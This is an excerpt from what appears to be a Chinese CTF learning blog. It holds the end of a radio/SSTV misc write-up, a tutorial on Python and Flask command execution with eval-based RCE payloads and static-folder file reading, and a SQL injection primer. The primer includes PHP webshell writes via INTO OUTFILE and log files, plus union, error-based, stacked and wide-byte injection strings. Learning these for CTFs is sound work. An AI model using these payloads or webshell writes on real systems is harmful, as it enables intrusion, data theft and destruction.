+<p>抱着试一试的心情给Deepseek跑了一下，两遍过，最支持国产的一集。。。</p>
+<pre><code class="highlight plaintext">import numpy as np
+from scipy.io import wavfile
+from scipy.signal import butter, lfilter
+
+def read_gr_file(filename, dtype=np.float32, endian=&quot;&lt;&quot;):
+    &quot;&quot;&quot;
+    读取 GRC 生成的二进制文件（如 blocks_file_sink 的输出）
+    - dtype: 数据类型（默认 float32）
+    - endian: 字节序（默认小端序 &quot;&lt;&quot;，大端序用 &quot;&gt;&quot;）
+    &quot;&quot;&quot;
+    # 以二进制模式读取文件
+    with open(filename, &quot;rb&quot;) as f:
+        raw_bytes = f.read()
+    
+
+# 转换为指定字节序和类型的 numpy 数组
+
+dt = np.dtype(f&quot;&#123;endian&#125;&#123;dtype().dtype.char&#125;&quot;)
+data = np.frombuffer(raw_bytes, dtype=dt)
+return data
+
+def main():
+
+    # 参数配置（与 GRC 一致）
+
+     samp_rate = 48000      # 音频采样率
+     if_rate = 192000       # 中频速率（usrp_rate/3 = 576000/3）
+     max_dev = 5e3          # FM最大频偏
+     endian = &quot;&lt;&quot;           # 字节序（GRC 默认小端序）
+
+try:
+
+    # 1. 读取I/Q数据（二进制模式）
+
+     i_data = read_gr_file(&quot;flag1.txt&quot;, dtype=np.float32, endian=endian)
+     q_data = read_gr_file(&quot;flag2.txt&quot;, dtype=np.float32, endian=endian)
+
+    # 检查长度一致性
+
+     if len(i_data) != len(q_data):
+         raise ValueError(&quot;I/Q数据长度不一致！&quot;)
+
+    # 2. 合并为复数信号（I + jQ）
+
+     complex_signal = i_data + 1j * q_data
+
+    # 3. FM解调（相位差分法）
+
+     phase = np.unwrap(np.angle(complex_signal))
+     demodulated = np.diff(phase) / (2 * np.pi * max_dev) * if_rate
+     demodulated = demodulated.astype(np.float32)
+
+    # 4. 重采样到音频采样率（48 kHz）
+
+     demodulated_resampled = demodulated[::4]  # 简单下采样
+
+    # 5. 低通滤波（300-5000 Hz，与GRC一致）
+
+     b, a = butter(4, 5000, fs=samp_rate, btype=&#x27;low&#x27;)
+     demodulated_resampled = lfilter(b, a, demodulated_resampled)
+
+    # 6. 归一化并保存为WAV
+
+     demodulated_resampled /= np.max(np.abs(demodulated_resampled)) * 1.2
+     wavfile.write(&quot;flag_recovered.wav&quot;, samp_rate, demodulated_resampled)
+
+     print(&quot;还原成功！保存为 flag_recovered.wav&quot;)
+
+except FileNotFoundError:
+    print(&quot;错误：未找到 flag1.txt 或 flag2.txt！&quot;)
+except Exception as e:
+    print(f&quot;错误：&#123;str(e)&#125;&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()</code></pre>
+
+<p>得到一个92.7MB的wav，那其实一想就是SSTV了，用RX-SSTV跑一下</p>
+<p>得到一张阿兹特克码，扫一下得到flag<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/2025-02-09_09.53.19.jpg" alt="2025-02-09_09.53.19"></p>
+<p>唉，不能老实做传统misc了,不去折腾研究一些东西感觉永远都只能是入门仔了。也算是吃一堑长一智吧。</p>
+]]></content>
+      <tags>
+        <tag>-CTF -Writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python的RCE姿势以及内存马注入</title>
+    <url>/2025/03/25/python%E7%9A%84RCE%E5%A7%BF%E5%8A%BF%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="python的rce姿势以及内存马注入"><a href="#python的rce姿势以及内存马注入" class="headerlink" title="python的rce姿势以及内存马注入"></a>python的rce姿势以及内存马注入</h1><p>python的SSTI是明白的，可是如果是先渲染再接受参数呢?只传参不渲染又该如何面对呢</p>
+<p>诶，注入一个内存马试试.?</p>
+<h2 id="Python-的命令执行"><a href="#Python-的命令执行" class="headerlink" title="Python 的命令执行"></a>Python 的命令执行</h2><p>不同于php自带的命令执行函数，python是要先引入模块的，参考jinja2模板注入找os内置函数的那个过程</p>
+<h3 id="OS模块"><a href="#OS模块" class="headerlink" title="OS模块"></a>OS模块</h3><p>经典款:</p>
+<h4 id="os-system"><a href="#os-system" class="headerlink" title="os.system:"></a><code>os.system</code>:</h4><p>可以用来执行系统命令,但是无法将系统命令执行的结果返回.如果执行成功了会返回0,失败了会返回1</p>
+<pre><code class="highlight python"><span class="keyword">import</span> os
+os.system(<span class="string">&#x27;dir&#x27;</span>)  //输出目录结构
+<span class="built_in">print</span>(os.system(<span class="string">&#x27;dir&#x27;</span>))  //输出目录结构,下一行输出<span class="number">0</span></code></pre>
+
+<h4 id="os-popen"><a href="#os-popen" class="headerlink" title="os.popen:"></a><code>os.popen</code>:</h4><p>可以用来将系统命令执行的结构存储到一个管道文件中(什么是管道文件?个人理解是类似php中的phar这种).然后可以通过read方法来将管道文件的内容返回</p>
+<pre><code class="highlight python"><span class="keyword">import</span> os
+out=os.popen(<span class="string">&#x27;dir&#x27;</span>)
+<span class="built_in">print</span>(out.read())</code></pre>
+
+<h3 id="subprocess模块"><a href="#subprocess模块" class="headerlink" title="subprocess模块"></a>subprocess模块</h3><p>可以认为subprocess是os模块的安全版</p>
+<h4 id="subprocess-run"><a href="#subprocess-run" class="headerlink" title="subprocess.run:"></a><code>subprocess.run</code>:</h4><p>基本是subprocess中最常用的模块,包含下列参数</p>
+<pre><code class="highlight python">subprocess.run(args, *, stdin=<span class="literal">None</span>, <span class="built_in">input</span>=<span class="literal">None</span>, stdout=<span class="literal">None</span>, stderr=<span class="literal">None</span>, capture_output=<span class="literal">False</span>, shell=<span class="literal">False</span>, cwd=<span class="literal">None</span>, timeout=<span class="literal">None</span>, check=<span class="literal">False</span>, encoding=<span class="literal">None</span>, errors=<span class="literal">None</span>, text=<span class="literal">None</span>, env=<span class="literal">None</span>, universal_newlines=<span class="literal">None</span>)</code></pre>
+
+<hr>
+<pre><code class="highlight plaintext">1.唯一一个必须要有的参数,为一个字符串列表/字符串,其中第一个值是一个应用程序,后面的则是传递的参数</code></pre>
+
+<pre><code class="highlight python"><span class="keyword">import</span> subprocess
+out=subprocess.run([<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;-p&quot;</span>],capture_output=<span class="literal">True</span>,text=<span class="literal">True</span>)
+<span class="built_in">print</span>(out.stdout)</code></pre>
+
+<p>这也是我们常说的弹计算器命令,但是需要注意,由于windows并不是像linux那样由纯文件组成,所以这里的列表中无法直接使用dir命令如<code>[&quot;dir&quot;]</code>(本质上这个dir是传递给windows.cmd的一个参数,但是这个windows.cmd程序的位置找不到)</p>
+<hr>
+<pre><code class="highlight plaintext">2.shell=True,默认为false</code></pre>
+
+<p>用于控制是否允许在第一个参数处直接使用shell命令的,开启后则可以不使列表而是以字符串形式直接使用,如:</p>
+<pre><code class="highlight python"><span class="keyword">import</span> subprocess
+out=subprocess.run(<span class="string">&quot;dir&quot;</span>,shell=<span class="literal">True</span>,capture_output=<span class="literal">True</span>,text=<span class="literal">True</span>)
+<span class="built_in">print</span>(out.stdout)</code></pre>
+
+<p>复现效果：</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325184321691.png" alt="image-20250325184321691"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325184555941.png" alt="image-20250325184555941"></p>
+<hr>
+<pre><code class="highlight plaintext">3.stdin,stdout,stderr,默认为false</code></pre>
+
+<p>这三个参数用来设置输入,输出和错误信息为管道对象或是类文件对象,这里不常用.</p>
+<hr>
+<pre><code class="highlight plaintext">4.capture_output=true,默认为false</code></pre>
+
+<p>用于捕获stdout和stderr时期不会输出到终端而是作为一个对象来返回.</p>
+<hr>
+<pre><code class="highlight plaintext">5.text=true,默认为false</code></pre>
+
+<p>默认状态下返回的数据为字节流,而<code>text=true</code>可以使得返回的数据为字符串而不是字节流,不用人手动转换.</p>
+<hr>
+<pre><code class="highlight plaintext">6.encoding=&#x27;utf-8&#x27;</code></pre>
+
+<p>如果指定了参数,则stdin,stdout,stderr可以接受该类型的数据,否则默认为字节流.可以认为是<code>text=true</code>的一个手动选择版</p>
+<hr>
+<pre><code class="highlight plaintext">7.timeout</code></pre>
+
+<p>设置命令超时时间.如果命令执行时间超时,子进程将被杀死,并弹出 <code>TimeoutExpired</code>异常.</p>
+<hr>
+<pre><code class="highlight plaintext">8.check=true</code></pre>
+
+<p>如果该参数设置为<code>True</code>,并且进程退出状态码不是0,则弹出<code>CalledProcessError</code>异常.</p>
+<h4 id="subprocess-Popen"><a href="#subprocess-Popen" class="headerlink" title="subprocess.Popen"></a><code>subprocess.Popen</code></h4><p>是subprocess方法的核心,可用于实现更为复杂的功能</p>
+<p>具体介绍就不给了，给两个大佬的博客自己选择着看看把(</p>
+<p><a href="https://www.cnblogs.com/-qing-/p/10934322.html">Python之subprocess模块 - 卿先生 - 博客园</a></p>
+<p><a href="https://www.cnblogs.com/yifengyu/p/16115712.html">python中的subprocess.Popen()、PIPE使用详解 - 平行时空的旅者 - 博客园</a></p>
+<p>直接开始本地复现</p>
+<pre><code class="highlight plaintext">import  subprocess
+p = subprocess.Popen(&quot;dir&quot;, shell=True,encoding=&quot;utf-8&quot;)</code></pre>
+
+<p>在linux成功复现</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325191600985.png" alt="image-20250325191600985"></p>
+<p>反观windows(</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325191725159.png" alt="image-20250325191725159"></p>
+<p>修了一下，是编码问题+一个stdout和stderr未重定向到PIPE的问题</p>
+<p>修了一下成功读取</p>
+<pre><code class="highlight python"><span class="keyword">import</span>  subprocess
+p = subprocess.Popen(<span class="string">&quot;dir&quot;</span>, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding=<span class="string">&quot;gbk&quot;</span>)
+
+stdout, stderr = p.communicate()
+
+<span class="built_in">print</span>(stdout)</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250325191538567.png" alt="image-20250325191538567"></p>
+<h4 id="subprocess-getoutput"><a href="#subprocess-getoutput" class="headerlink" title="subprocess.getoutput"></a><code>subprocess.getoutput</code></h4><p>接收字符串格式的命令，执行命令并返回执行结果，其功能类似于os.popen(cmd).read()和commands.getoutput(cmd)。</p>
+<p>用于执行系统命令,并将stdout和stderr直接捕获(不输出到终端)并以字符串形式返回</p>
+<pre><code class="highlight python"><span class="keyword">import</span> os
+<span class="keyword">import</span> subprocess
+out=subprocess.getoutput(<span class="string">&quot;dir&quot;</span>) <span class="comment"># 到这还没有输出</span>
+<span class="built_in">print</span>(out) <span class="comment">#到这才有的输出</span></code></pre>
+
+<h4 id="subprocess-check-output"><a href="#subprocess-check-output" class="headerlink" title="subprocess.check_output"></a><code>subprocess.check_output</code></h4><p>可以理解为<code>subprocess.run</code>和<code>subprocess.getoutput</code>的结合版.会将stdout捕获作为字符串返回,同时也可以像<code>subprocess.run</code>一样使用较为复杂的自定义功能.</p>
+<pre><code class="highlight python"><span class="keyword">import</span> subprocess
+out=subprocess.check_output(<span class="string">&quot;dir&quot;</span>,shell=<span class="literal">True</span>,text=<span class="literal">True</span>)<span class="comment"># 到这还没有输出</span>
+<span class="built_in">print</span>(out) <span class="comment">#到这才有的输出</span></code></pre>
+
+<h4 id="subprocess-call-及check-call"><a href="#subprocess-call-及check-call" class="headerlink" title="subprocess.call() 及check_call()"></a><code>subprocess.call() </code>及<code>check_call()</code></h4><p><code>subprocess.call() </code>为python3.5以前版本使用,与<code>subprocess.run()</code>用法基本一致,但call()返回的为命令结束码,无法获取更多信息,不推荐使用,现已被run()取代.<br><code>subprocess.check_call() </code>与<code>call()</code>的区别为,<code>check_call()</code>如果命令失败(即 returncode不为0)会主动抛出<code>subprocess.CalledProcessError</code>异常,使用<code>subprocess.run(check=True)</code>可取代<code>subprocess.check_call()</code>.</p>
+<h3 id="send-file"><a href="#send-file" class="headerlink" title="send_file"></a>send_file</h3><p>是类似于<code>render_template</code>和<code>redirect</code>的一种用于前后端交互的方法,可以下载指定的文件.</p>
+<pre><code class="highlight python"><span class="keyword">import</span> os
+<span class="keyword">import</span> subprocess
+<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for,session, send_file, Response
+app = Flask(__name__)
+<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
+<span class="keyword">def</span> <span class="title function_">index</span>():
+    <span class="keyword">return</span> send_file(<span class="string">&#x27;D:\\114514.docx&#x27;</span>)
+<span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:
+    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>)</code></pre>
+
+<h3 id="eval和exec"><a href="#eval和exec" class="headerlink" title="eval和exec"></a>eval和exec</h3><p>eval()和 exec()函数的功能是相似的,都可以执行一个字符串形式的 Python代码(代码以字符串的形式提供),相当于一个Python的解释器.二者不同之处在于,eval()执行完要返回结果,而exec()执行完不返回结果.</p>
+<pre><code class="highlight python"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file
+app = Flask(__name__)
+<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
+<span class="keyword">def</span> <span class="title function_">index</span>():
+    <span class="keyword">if</span> <span class="keyword">not</span> request.args.get(<span class="string">&quot;cmd&quot;</span>):
+        <span class="keyword">return</span> send_file(<span class="string">&quot;app.py&quot;</span>)
+    <span class="keyword">else</span>:
+        cmd=request.args.get(<span class="string">&quot;cmd&quot;</span>)
+        res=<span class="built_in">eval</span>(cmd)
+        <span class="keyword">return</span> res
+<span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:
+    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>)</code></pre>
+
+<p>payload:</p>
+<pre><code class="highlight python">?cmd=<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;ls%20/&quot;</span>).read()
+?cmd=<span class="built_in">__import__</span>(<span class="string">&quot;subprocess&quot;</span>).run(<span class="string">&quot;tac%20/flag&quot;</span>, shell=<span class="literal">True</span>,
+capture_output=<span class="literal">True</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>).stdout
+?cmd=<span class="built_in">__import__</span>(<span class="string">&quot;subprocess&quot;</span>).check_output(<span class="string">&quot;cat /flag&quot;</span>,
+shell=<span class="literal">True</span>).decode(<span class="string">&quot;utf-8&quot;</span>)
+?cmd=<span class="built_in">__import__</span>(<span class="string">&quot;subprocess&quot;</span>).getoutput(<span class="string">&quot;cat /flag&quot;</span>)
+?cmd=send_file(<span class="string">&quot;/flag&quot;</span>)</code></pre>
+
+<p>这里面的<code>__import__(&quot;os&quot;)</code>一类的用法是用于动态导入模块的.</p>
+<h2 id="Flask-RCE利用-内存马篇"><a href="#Flask-RCE利用-内存马篇" class="headerlink" title="Flask RCE利用(内存马篇)"></a>Flask RCE利用(内存马篇)</h2><p>看过了python，但是flask和python又不是同一回事情，因为flask下有很多可供调用的函数，只能可以参考一点python的,但大多数时候是flask下特有的函数打的有问题(</p>
+<h3 id="static-folder-任意文件读取"><a href="#static-folder-任意文件读取" class="headerlink" title="static_folder 任意文件读取"></a>static_folder 任意文件读取</h3><p>flask在初始化的时候 会设置很多内部的属性</p>
+<pre><code class="highlight plaintext">python
+def __init__(
+        self,
+        import_name: str,
+        static_url_path: str | None = None,
+        static_folder: str | os.PathLike | None = &quot;static&quot;,
+        static_host: str | None = None,
+        host_matching: bool = False,
+        subdomain_matching: bool = False,
+        template_folder: str | os.PathLike | None = &quot;templates&quot;,
+        instance_path: str | None = None,
+        instance_relative_config: bool = False,
+        root_path: str | None = None,
+    ):
+    #还有一些其他的成员
+self.config 用来存储配置  self.extensions 用来存储扩展的状态。
+self.aborter 和 self.url_build_error_handlers 用来处理 HTTP 错误和 URL 构建错误。
+self.teardown_appcontext_funcs 和 self.shell_context_processors 用来管理应用上下文和 shell 上下文。
+self.blueprints 用来组织应用的模块化功能，self.url_map 管理路由规则。
+self.url_map 储存了应用的路由信息
+self.add_url_rule用来添加 URL 规则</code></pre>
+
+<p>注意到是这个</p>
+<pre><code class="highlight plaintext">plaintext
+static_url_path: str | None = None 指定静态文件的 URL 路径（即浏览器中访问静态文件的路径）
+static_folder 指定静态文件所在的文件夹路径</code></pre>
+
+<p>如果我们修改了相关的值 就可能会造成任意文件读取</p>
+<p>不过在参数传递的时候 不可以使用&#x3D;给这些东西赋值 需要使用setattr这个给他们赋值</p>
+<pre><code class="highlight plaintext">plaintext
+setattr(app,&#x27;_static_folder&#x27;,&#x27;/&#x27;)</code></pre>
+
+<h3 id="路由注入"><a href="#路由注入" class="headerlink" title="路由注入"></a>路由注入</h3><h3 id><a href="#" class="headerlink" title></a></h3><h3 id="-1"><a href="#-1" class="headerlink" title></a></h3><h3 id="-2"><a href="#-2" class="headerlink" title></a></h3><h3 id="-3"><a href="#-3" class="headerlink" title></a></h3><h2 id="Flask-RCE利用-debug篇"><a href="#Flask-RCE利用-debug篇" class="headerlink" title="Flask RCE利用(debug篇)"></a>Flask RCE利用(debug篇)</h2><h2 id="一些辅助工作"><a href="#一些辅助工作" class="headerlink" title="一些辅助工作"></a>一些辅助工作</h2><p>一般会在一开始套个session 的验证</p>
+<p>这里就要用到session伪造的芝士了，首先了解一下session罢</p>
+<p>1）flask session 分析<br>flask对session的处理位于flask&#x2F;sessions.py中，默认情况下flask的session以cookie的形式保存于客户端，利用签名机制来防止数据被篡改。</p>
+<pre><code class="highlight plaintext">.eJwljrFuwzAMBf9FcwZSpkQyP2NQoh5aBGgBO5mC_HsNdLy75d5lx7HOr3J_Hq91K_t3lnuxGamDI6kmLPpa1TE0UKteyYSpJyaaVJ8hRGZDk7ZtLlEbpALjxjOc1SaZWzLSx-aB3p0djSta984kjXqMrQqrE3WhBMo18jrX8X_D9eJ5Htifv4_1cxltCgQ3V0zvIsGBjDAlGQsqNJEi08vnD15kP8Q.XxKIMg.iW96TDgIamKLQ0x9h5LoPsUCIvw
+1</code></pre>
+
+<ul>
+<li>通过.隔开的3段内容，第一段其实就是base64 encode后的内容，但去掉了填充用的等号，若decode失败，自己需要补上1-3个等号补全。中间内容为时间戳，在flask中时间戳若超过31天则视为无效。最后一段则是安全签名，将sessiondata,时间戳，和flask的secretkey通过sha1运算的结果。</li>
+</ul>
+<pre><code class="highlight plaintext">json-&gt;zlib-&gt;base64后的源字符串 . 时间戳 . hmac签名信息
+1</code></pre>
+
+<ul>
+<li>服务端每次收到cookie后，会将cookie中前两段取出和secretkey做sha1运算，若结果与cookie第三段不一致则视为无效。</li>
+<li>从cookie获取session的过程便是验证签名-&gt;验证是否过期-&gt;解码。</li>
+</ul>
+<p>[参考文章]: <a href="https://blog.csdn.net/weixin_44190459/article/details/116774912">https://blog.csdn.net/weixin_44190459/article/details/116774912</a>	“flask框架漏洞”<br>[参考文章]: <a href="https://www.cnblogs.com/meraklbz/p/18260893">https://www.cnblogs.com/meraklbz/p/18260893</a>	“python rce”</p>
+]]></content>
+      <tags>
+        <tag>-Web -CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>从零开始的SQL注入生活</title>
+    <url>/2025/03/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/</url>
+    <content><![CDATA[<h1 id="从零开始的SQL注入生活"><a href="#从零开始的SQL注入生活" class="headerlink" title="从零开始的SQL注入生活"></a>从零开始的SQL注入生活</h1><p>字义上的从零开始喵。。字义上的私了好多次喵。。。</p>
+<h2 id="Episode-1-SQL数据库基础操作"><a href="#Episode-1-SQL数据库基础操作" class="headerlink" title="Episode 1   SQL数据库基础操作"></a>Episode 1   SQL数据库基础操作</h2><ul>
+<li><strong>创建</strong></li>
+</ul>
+<pre><code class="highlight sql"><span class="keyword">create</span> database_name;#建立一个数据库
+<span class="keyword">create</span> <span class="keyword">table</span> table_name(
+column1 datatype,
+.......
+);#建立一个表
+</code></pre>
+
+
+
+<ul>
+<li><strong>查询</strong></li>
+</ul>
+<pre><code class="highlight sql"><span class="keyword">show</span> tables; <span class="operator">/</span><span class="operator">/</span>显示当前选中的数据库中的所有表名
+<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit <span class="number">1</span>; <span class="operator">/</span><span class="operator">/</span>获取第一行的数据，可以通过这个方法得到表中所有的字段名，不会被大量数据顶走
+<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名]; #查询整表
+<span class="keyword">select</span> [列名<span class="number">1</span>, 列名<span class="number">2</span>,...] <span class="keyword">from</span> [库名.表名]; #指定列查询
+<span class="keyword">select</span> [表达式<span class="number">1</span>, 表达式<span class="number">2</span>,...] <span class="keyword">from</span> [库名.表名]; #查询表达式字段
+group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata
+<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27; &#x27;</span>
+<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27; &#x27;</span>
+<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名] <span class="keyword">order</span> <span class="keyword">by</span> [排序字段] #排序
+#条件查询<span class="keyword">Where</span>
+(<span class="number">1</span>)比较运算符 (<span class="number">2</span>)<span class="keyword">BETWEEN</span> ... <span class="keyword">AND</span> ... (<span class="number">3</span>)<span class="keyword">IN</span> (<span class="number">4</span>)<span class="keyword">IS</span> <span class="keyword">NULL</span> (<span class="number">5</span>)<span class="keyword">LIKE</span> (<span class="number">6</span>)<span class="keyword">AND</span> (<span class="number">7</span>)<span class="keyword">OR</span> 
+(<span class="number">8</span>)<span class="keyword">NOT</span>
+<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名] <span class="keyword">where</span> [条件];</code></pre>
+
+<ul>
+<li><strong>插入</strong></li>
+</ul>
+<pre><code class="highlight sql"><span class="keyword">insert</span> <span class="keyword">into</span> table_names (column1,column2,column3...)
+<span class="keyword">insert</span> <span class="keyword">into</span> (table1,table2,table3) <span class="keyword">values</span> (value1,value2,value3) #替换键已存在的值
+<span class="keyword">on</span> duplicate key <span class="keyword">update</span> ()#不会了，留个坑先(</code></pre>
+
+<ul>
+<li><strong>注马</strong></li>
+</ul>
+<pre><code class="highlight sql"><span class="keyword">select</span> &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">into</span> outfile&quot;D:\\phpstudy_pro\\WWW\\shell.php&quot;
+<span class="number">2.</span>利用日志文件写入木马
+<span class="number">1.</span>开启日志功能
+
+<span class="keyword">set</span> <span class="keyword">global</span> slow_query_log<span class="operator">=</span><span class="number">1</span>;
+<span class="number">2.</span>设置日志存储路径
+
+<span class="keyword">SET</span> <span class="keyword">GLOBAL</span> slow_query_log_file<span class="operator">=</span><span class="string">&#x27;D:\\phpstudy_pro\\WWW\\shell.php&#x27;</span>;
+<span class="number">3.</span>执行<span class="keyword">sql</span>语句
+
+<span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_GET[H])?&gt;&#x27;</span> <span class="keyword">or</span> SLEEP(<span class="number">11</span>);
+</code></pre>
+
+
+
+<h2 id="episode-2-基础注入"><a href="#episode-2-基础注入" class="headerlink" title="episode 2  基础注入"></a>episode 2  基础注入</h2><h3 id="union注入-1’"><a href="#union注入-1’" class="headerlink" title="union注入(-1’)"></a>union注入(-1’)</h3><p>union注入原本是用于合并多条select查询结果；通过-1造成前面一条查询语句返回为空，从而显示我们注入的查询语句。(因为网页只能够显示一条查询记录)</p>
+<pre><code class="highlight sql">#<span class="number">1.</span>查表列数
+<span class="number">-1</span>’<span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span><span class="operator">~</span><span class="number">4</span>;
+#查完后使用<span class="keyword">select</span> 语句
+<span class="keyword">select</span> <span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>；
+#查库名
+<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>，database()；
+#查表名
+<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>’security’),<span class="number">3</span>#
+#查列名
+<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>’security’ <span class="keyword">and</span> table_name<span class="operator">=</span>’emails’),<span class="number">3</span>#
+#直接查数据
+<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> email_id <span class="keyword">from</span> emails limit <span class="number">2</span>,<span class="number">1</span>),<span class="number">3</span>#
+
+#其实还是更推荐urlcode一下注释符号防止没有回弹(<span class="operator">%</span><span class="number">23</span>)</code></pre>
+
+<p>那初学的师傅可能就会不明白这个1，2，3是什么意思</p>
+<p>这个1，2，3实际是可以帮助我们快速判断列数的工具(<del>order by:那我呢？</del>)同时，这个1，2，3无关顺序，只要找到回显位并且已经爆出数据表的情况下就可以在回显位写注入语句进一步爆</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>1.extractvalue函数</p>
+<p>查询对象xml某一个标签的值</p>
+<p>如果查询的标签格式不对，就会报错</p>
+<p>利用concat函数来链接两个字符串</p>
+<p>查询数据库：’ and extractvalue(‘div’,concat(‘~’,database()))#</p>
+<pre><code class="highlight sql"><span class="number">-1</span><span class="string">&#x27; and(select extractive(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,database())))#</span></code></pre>
+
+<p>-&gt;查询div，~存在会报错</p>
+<p>爆出~database（）</p>
+<p>2.updatexml</p>
+<p>更新xml文档内容</p>
+<p>语法：updatexml(‘xml名’，’路径名’，更新值)；</p>
+<p>同样道理，当没有对应路径的时候会报错</p>
+<pre><code class="highlight plaintext">&#x27; and updatexml(&#x27;div&#x27;, concat(&#x27;~&#x27;,database()),&#x27;hi&#x27;)#
+&#x27; union select 1,(extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata))))--+
+</code></pre>
+
+<p>其他同上</p>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入(!)"></a>堆叠注入(!)</h3><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid&#x3D;1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
+<pre><code class="highlight plaintext">堆叠注入中奇怪的知识点
+1.输入数字有回显而字符没有回显，说明了语句中存在||结构 (在sql中表示连接符号)
+设置 sql_mode=PIPES_AS_CONCAT来转换操作符的作用。（sql_mode设置） 利用PIPES_AS_CONCAT令||起到连接符的作用。
+</code></pre>
+
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>在正常注册(假设账户名为admin)后登录，尝试修改密码，使用admin’#这个用户名修改却发现成功修改了admin的密码，这就说明存在二次注入的漏洞了</p>
+<pre><code class="highlight plaintext">二次注入，实际上就是在注入数据之后，利用系统查询数据的用脏数据进行第二次的攻击，从而达到入侵数据库的目的</code></pre>
+
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h4><p>一般来说，如果开发人员在开发的时候，对传入的参数进行了特殊的函数处理，比如使用了trim()函数，htmlspecialchars()函数，addlashes函数，是可以过滤我们非法提交的参数，从而导致SQL注入无法成功。</p>
+<p>作为攻击者，要完成的是对参数的拼接，从而导致恶意的SQL语句写入。作为开发者要完成的是SQL输出参数的一个过滤比如对恶意的字符进行转移</p>
+<h4 id="常用过滤函数"><a href="#常用过滤函数" class="headerlink" title="常用过滤函数"></a><strong>常用过滤函数</strong></h4><p><strong>trim()函数</strong><br>移除字符串两侧的空白字符或其他预定义字符<br><strong>htmlspecialchars()函数</strong><br>把预定义的字符”&lt;”和”&gt;”转换为HTML实体，预防XSS<br><strong>addslashes()函数</strong><br>返回在预定义字符之前添加反斜杠的字符串</p>
+<pre><code class="highlight sql"># 预定义字符
+<span class="number">1.</span>单引号(<span class="string">&#x27;)</span>
+<span class="string">2.双引号(&quot;)</span>
+<span class="string">3.反斜杠(\)</span>
+<span class="string">4.NULL</span></code></pre>
+
+<p>上述函数常在CMS里使用进行过滤</p>
+<h4 id="宽字节注入条件"><a href="#宽字节注入条件" class="headerlink" title="宽字节注入条件"></a><strong>宽字节注入条件</strong></h4><p>1.数据库为GBK编码<br>2.使用了转义函数，将、POGETST、cookie传递的参数进行过滤，将单引号、双引号、null等敏感字符用转义符 \ 进行转义</p>
